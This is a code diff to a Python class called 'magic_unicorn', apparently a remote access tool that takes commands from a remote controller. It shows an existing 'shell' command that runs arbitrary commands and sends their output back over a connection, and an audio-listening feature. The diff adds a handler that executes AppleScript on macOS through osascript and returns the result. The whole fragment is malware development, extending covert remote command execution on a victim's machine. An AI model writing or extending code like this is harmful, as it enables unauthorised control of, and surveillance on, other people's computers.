@@ -118,6 +118,10 @@ class magic_unicorn:
     def openurl(self, url):
         browser.open(url)
 
+    def execute_osascript(self, script):
+        script = "osascript -e " + script
+        self.unicorn.send(bytes(self.execute(script).strip()))
+        
     def listen_audio(self):
         try:
             import pyaudio
@@ -225,6 +229,8 @@ class magic_unicorn:
                     self.sysinfo()
                 elif command[0] == "shell":
                     self.unicorn.send(bytes(self.execute(command[1]).strip()))
+                elif command[0] == "osascript":
+                    self.execute_osascript(command[1])
                 else:
                     pass
         sys.exit()
